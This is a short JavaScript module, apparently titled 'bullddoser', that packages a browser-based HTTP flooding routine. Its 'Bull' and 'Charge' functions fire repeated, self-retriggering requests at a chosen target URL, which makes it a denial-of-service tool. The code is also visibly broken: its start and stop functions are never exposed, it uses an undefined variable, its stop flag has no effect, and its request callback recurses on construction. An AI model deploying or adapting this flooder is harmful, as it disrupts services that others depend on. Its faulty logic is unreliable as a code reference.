(function universalModuleDefinition(root, factory) {
    "use strict";

    if(typeof exports === 'object' && typeof module === 'object') {
        // Node module exports
        module.exports = factory();
    }
    else if(typeof define === 'function' && define.amd) {
        // AMD. Register as an anonymous module.
        define([], factory);
    }
    else if(typeof exports === 'object') {
        // CommonJS style that does not support module.exports
        exports['bullddoser'] = factory();
    }
    else {
        // Global
        root['bullddoser'] = factory();
    }
}(this, function () {
    "use strict";
    
    function Bull(method, target, data) {
        var bullfighterEnters = false;
        
        function Charge(method, target, data) {
            var http = new XMLHttpRequest(); 

            http.open(method, target, true); 

            http.onreadystatechange = this.bullfighterWins ? function(){} : new Charge(method, target, data);

            http.send((!data.length && method === "POST") ? null : data);
        }
        
        function start() {
            var bullfighterEnters = false;
            
            for(var i = 0; i < browserCap; i++) {
                new Charge(method, target, data);
            }
        }
        
        function stop() {
            var bullfighterEnters = true;
        }
    }
    
    Bull.browserCap = 6;
    
    return {
        create: function(method, target, data) {
            return new Bull(method, target, data);
        }
    };
}));